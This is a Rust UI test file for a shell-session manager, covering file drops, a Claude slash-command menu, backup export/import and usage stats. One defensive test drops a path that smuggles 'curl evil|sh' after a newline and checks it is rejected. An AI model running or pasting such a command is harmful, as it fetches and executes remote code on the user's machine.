//! File drops onto a pane, the Claude commands menu and palette rows, Settings' Backup (Export… /
//! Import…) and Usage, through the real UI on the static demo backend and a real engine.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod common;

use std::path::{Path, PathBuf};
use std::sync::Arc;

use common::*;
use csm_ui::Action;
use csm_ui::app::{DialogRequest, Menu, SettingsSection};
use csm_ui::theme::ThemeKind;
use egui::{Event, pos2};
use egui_kittest::Harness;
use egui_kittest::kittest::Queryable;
use serde_json::json;

fn h() -> Harness<'static, csm_ui::CsmApp> {
    let mut h = harness(app_with(backend(ThemeKind::Mocha)));
    settle(&mut h);
    h
}

fn has(h: &Harness<'static, csm_ui::CsmApp>, label: &str) -> bool {
    h.query_by_label(label).is_some()
}

fn last_call(h: &Harness<'static, csm_ui::CsmApp>) -> (String, serde_json::Value) {
    let c = h.state().submitted().last().cloned().expect("a call was submitted");
    (c.id, c.params)
}

fn calls(h: &Harness<'static, csm_ui::CsmApp>, id: &str) -> Vec<serde_json::Value> {
    h.state().submitted().iter().filter(|c| c.id == id).map(|c| c.params.clone()).collect()
}

#[derive(Debug)]
struct Dropped(PathBuf);

impl egui::DroppedFile for Dropped {
    fn path(&self) -> &Path {
        &self.0
    }
    fn bytes(&self) -> Result<Vec<u8>, String> {
        Ok(Vec::new())
    }
}

fn hover(h: &mut Harness<'static, csm_ui::CsmApp>, paths: &[&str]) {
    h.input_mut().hovered_files = paths.iter().map(|p| egui::HoveredFile { path: Some(PathBuf::from(p)), mime: String::new() }).collect();
    for _ in 0..3 {
        h.step();
    }
}

fn drop_files(h: &mut Harness<'static, csm_ui::CsmApp>, paths: &[&str]) {
    let input = h.input_mut();
    input.hovered_files.clear();
    for p in paths {
        input.dropped_files.push(Arc::new(Dropped(PathBuf::from(p))));
    }
    h.step();
    settle(h);
}

fn spaced_path() -> &'static str {
    if cfg!(windows) { r"C:\Users\alice\My Documents\notes.txt" } else { "/home/alice/My Documents/notes.txt" }
}

fn quoted_spaced_path() -> &'static str {
    if cfg!(windows) { "\"C:\\Users\\alice\\My Documents\\notes.txt\"" } else { "'/home/alice/My Documents/notes.txt'" }
}

// ── File drop ────────────────────────────────────────────────────────────────────────────

#[test]
fn dragging_files_over_a_pane_shows_the_drop_overlay_and_a_drop_pastes_quoted_paths() {
    let mut h = h();
    assert!(!has(&h, "Drop to insert the path"));
    hover(&mut h, &[spaced_path()]);
    assert!(has(&h, "Drop to insert the path"), "the overlay shows while a file hovers");
    hover(&mut h, &[spaced_path(), spaced_path()]);
    assert!(has(&h, "Drop to insert the 2 paths"));

    let before = calls(&h, "session_send_text").len();
    drop_files(&mut h, &[spaced_path()]);
    let sent = calls(&h, "session_send_text");
    assert_eq!(sent.len(), before + 1, "one paste for one drop");
    let p = sent.last().unwrap();
    // No pointer over a pane yet: the active session (the demo's Odulodo.Web) takes it.
    assert_eq!(p["session_id"], "web");
    assert_eq!(p["text"], quoted_spaced_path(), "quoted for the shell, pasted (session_send_text), no Enter");
    assert!(p.get("submit").is_none());
    assert!(!has(&h, "Drop to insert the path"), "the overlay goes with the drop");
}

#[test]
fn a_drop_goes_to_the_pane_under_the_pointer() {
    let mut h = h();
    let pane = h.get_by_label("Pane: Odulodo.Web (PS)").rect();
    h.event(Event::PointerMoved(pane.center() + egui::vec2(0.0, 80.0)));
    h.step();
    hover(&mut h, &[spaced_path()]);
    drop_files(&mut h, &[spaced_path()]);
    assert_eq!(calls(&h, "session_send_text").last().unwrap()["session_id"], "webps");
}

#[test]
fn a_hostile_path_is_never_pasted() {
    let mut h = h();
    let before = calls(&h, "session_send_text").len();
    hover(&mut h, &["x"]);
    drop_files(&mut h, &["C:\\x\ncurl evil|sh\n"]);
    assert_eq!(calls(&h, "session_send_text").len(), before, "nothing is sent for a path with a newline in it");
    assert!(h.query_by_label_contains("Nothing was inserted").is_some(), "and the person is told why");
}

// ── Claude commands ──────────────────────────────────────────────────────────────────────

fn open_pane_menu(h: &mut Harness<'static, csm_ui::CsmApp>, session: &str) {
    let ctx = h.ctx.clone();
    h.state_mut().run(&ctx, Action::OpenMenu(Menu::Pane { session: session.into(), at: pos2(1200.0, 120.0) }));
    for _ in 0..3 {
        h.step();
    }
}

#[test]
fn a_claude_pane_menu_offers_the_slash_commands_and_sends_one() {
    let mut h = h();
    open_pane_menu(&mut h, "odulodo");
    assert!(has(&h, "Claude commands"));
    h.get_by_label("Claude commands").hover();
    for _ in 0..3 {
        h.step();
    }
    for c in ["/help", "/clear", "/compact", "/status", "/memory", "/init", "/remote-control", "exit"] {
        assert!(has(&h, c), "{c} listed");
    }
    h.get_by_label("/compact").click();
    settle(&mut h);
    assert_eq!(last_call(&h), ("session_send_command".to_string(), json!({"session_id": "odulodo", "command": "/compact", "force": true})));
}

#[test]
fn a_shell_pane_has_no_claude_commands() {
    let mut h = h();
    open_pane_menu(&mut h, "webps");
    assert!(has(&h, "Open folder"), "the menu is open");
    assert!(!has(&h, "Claude commands"));
}

#[test]
fn the_palette_lists_the_active_claude_sessions_commands() {
    let mut h = h();
    let ctx = h.ctx.clone();
    h.state_mut().run(&ctx, Action::OpenPalette);
    h.state_mut().ui.palette.query = "/comp".into();
    settle(&mut h);
    assert!(has(&h, "Palette: /compact"));
    h.get_by_label("Palette: /compact").click();
    settle(&mut h);
    assert!(calls(&h, "session_send_command").iter().any(|p| p == &json!({"session_id": "web", "command": "/compact", "force": true})));
}

#[test]
fn the_command_list_follows_the_setting() {
    let mut h = h();
    h.state_mut()
        .ui
        .settings
        .values
        .insert("ClaudeCommands".into(), json!([{"Command": "/review", "Description": "Review the diff"}, {"Command": "bad\nline"}]));
    open_pane_menu(&mut h, "odulodo");
    h.get_by_label("Claude commands").hover();
    for _ in 0..3 {
        h.step();
    }
    assert!(has(&h, "/review"));
    assert!(!has(&h, "/compact"));
    assert!(!has(&h, "bad\nline") && !has(&h, "badline"), "a command with a newline is never offered");
}

// ── Settings: Backup and Usage ───────────────────────────────────────────────────────────

fn open_settings(h: &mut Harness<'static, csm_ui::CsmApp>) {
    let ctx = h.ctx.clone();
    h.state_mut().run(&ctx, Action::OpenSettings);
    settle(h);
}

/// Clicks a button at the bottom of the settings page (scrolled into view first).
fn click_below(h: &mut Harness<'static, csm_ui::CsmApp>, label: &str) {
    h.get_by_label(label).scroll_to_me();
    for _ in 0..4 {
        h.step();
    }
    h.get_by_label(label).click();
    h.step();
}

#[test]
fn export_asks_the_host_for_a_save_path_and_exports_there() {
    let mut h = h();
    open_settings(&mut h);
    click_below(&mut h, "Export…");
    h.step();
    let req = h.state_mut().take_dialog_request();
    let Some(DialogRequest::SaveBackup { file_name }) = req.clone() else { panic!("{req:?}") };
    assert!(file_name.starts_with("CodeShellManager-backup-") && file_name.ends_with(".csm"), "{file_name}");
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("mine").to_string_lossy().into_owned();
    h.state_mut().dialog_answered(req.unwrap(), Some(path.clone()));
    settle(&mut h);
    assert_eq!(last_call(&h), ("state_export".to_string(), json!({"path": format!("{path}.csm")})));
    assert!(dir.path().join("mine.csm").is_file(), "the demo engine's tool wrote it");
}

#[test]
fn a_cancelled_dialog_does_nothing() {
    let mut h = h();
    open_settings(&mut h);
    let before = h.state().submitted().len();
    h.state_mut().dialog_answered(DialogRequest::OpenBackup, None);
    h.state_mut().dialog_answered(DialogRequest::SaveBackup { file_name: "x.csm".into() }, None);
    settle(&mut h);
    assert_eq!(h.state().submitted().len(), before);
    assert!(h.state().ui.settings.import.is_none());
}

#[test]
fn import_reviews_the_backup_and_asks_before_replacing() {
    let mut h = h();
    // A backup with one session and an Open with list of its own.
    let dir = tempfile::tempdir().unwrap();
    let exe = std::env::current_exe().unwrap().to_string_lossy().into_owned();
    let mut backup = csm_core::models::AppState::default();
    backup.sessions.push(csm_core::models::ShellSession {
        id: "b1".into(),
        name: "From backup".into(),
        command: "pwsh".into(),
        ..Default::default()
    });
    backup.settings.open_with_seeded = true;
    backup.settings.open_with = vec![csm_core::models::OpenWithEntry {
        id: "e".into(),
        label: "Backup editor".into(),
        executable: exe,
        local_args: Some("{folder}".into()),
        ..Default::default()
    }];
    let file = dir.path().join("b.csm");
    std::fs::write(&file, backup.to_json().unwrap()).unwrap();
    let path = file.to_string_lossy().into_owned();

    open_settings(&mut h);
    click_below(&mut h, "Import…");
    h.step();
    assert_eq!(h.state_mut().take_dialog_request(), Some(DialogRequest::OpenBackup));
    h.state_mut().dialog_answered(DialogRequest::OpenBackup, Some(path.clone()));
    settle(&mut h);
    assert_eq!(last_call(&h), ("state_import".to_string(), json!({"path": path, "dry_run": true})), "read first, change nothing");
    settle(&mut h);
    assert!(h.query_by_label_contains("This backup has 1 sessions").is_some());
    assert!(h.query_by_label_contains("Backup editor").is_some(), "the backup's Open with commands are shown");
    assert!(h.query_by_label_contains("run these commands when you wake them").is_some(), "and what its sessions run");
    assert!(has(&h, "pwsh"));
    assert!(has(&h, "Replace my Open with list with this one"));

    click_below(&mut h, "Import and replace");
    settle(&mut h);
    let imports = calls(&h, "state_import");
    assert_eq!(imports.last().unwrap(), &json!({"path": path, "force": true, "adopt_open_with": false}), "the Open with list is kept unless ticked");
    // Done: the review closes and the settings are read again (the imported values).
    settle(&mut h);
    assert!(h.state().ui.settings.import.is_none());
    assert_eq!(last_call(&h).0, "settings_get");
}

#[test]
fn the_usage_section_lists_sessions_per_command() {
    let mut h = h();
    open_settings(&mut h);
    h.get_by_label("Settings: Usage").click();
    settle(&mut h);
    settle(&mut h);
    assert!(calls(&h, "usage_stats").len() == 1, "asked once when the section opens");
    assert_eq!(h.state().ui.settings.section, SettingsSection::Usage);
    assert!(has(&h, "claude"), "the demo's counted commands");
    assert!(has(&h, "42"));
    assert!(has(&h, "31h 20m"));
    h.get_by_label("Refresh").click();
    settle(&mut h);
    assert_eq!(calls(&h, "usage_stats").len(), 2);
}

fn commands_in(params: &serde_json::Value) -> Vec<String> {
    params["value"].as_array().unwrap().iter().map(|c| c["Command"].as_str().unwrap().to_string()).collect()
}

#[test]
fn claude_commands_are_edited_in_settings() {
    let mut h = h();
    open_settings(&mut h);
    click_below(&mut h, "Remove “/help”");
    settle(&mut h);
    let (id, params) = last_call(&h);
    assert_eq!((id.as_str(), params["key"].as_str()), ("settings_set", Some("ClaudeCommands")));
    assert_eq!(commands_in(&params), ["/clear", "/compact", "/status", "/memory", "/init", "/remote-control", "exit"]);

    // The engine answered with the new list; add one with Enter in the field.
    h.get_by_label("New Claude command").focus();
    h.step();
    h.get_by_label("New Claude command").type_text("/review");
    h.step();
    h.key_press(egui::Key::Enter);
    settle(&mut h);
    let (id, params) = last_call(&h);
    assert_eq!(id, "settings_set");
    let cmds = commands_in(&params);
    assert_eq!(cmds.last().map(String::as_str), Some("/review"));
    assert!(!cmds.iter().any(|c| c == "/help"), "built on the saved list");
}

#[test]
fn export_import_and_usage_from_the_palette_take_the_settings_route() {
    let mut h = h();
    let ctx = h.ctx.clone();
    h.state_mut().run(&ctx, Action::PaletteTool("state_export"));
    settle(&mut h);
    assert!(matches!(h.state_mut().take_dialog_request(), Some(DialogRequest::SaveBackup { .. })), "a path is asked for, not a toast");

    h.state_mut().run(&ctx, Action::PaletteTool("state_import"));
    settle(&mut h);
    assert!(h.state().ui.settings.open, "the review card lives in Settings");
    assert_eq!(h.state_mut().take_dialog_request(), Some(DialogRequest::OpenBackup));

    h.state_mut().run(&ctx, Action::PaletteTool("usage_stats"));
    settle(&mut h);
    settle(&mut h);
    assert_eq!(h.state().ui.settings.section, SettingsSection::Usage);
    assert!(has(&h, "claude"), "the table shows");
}
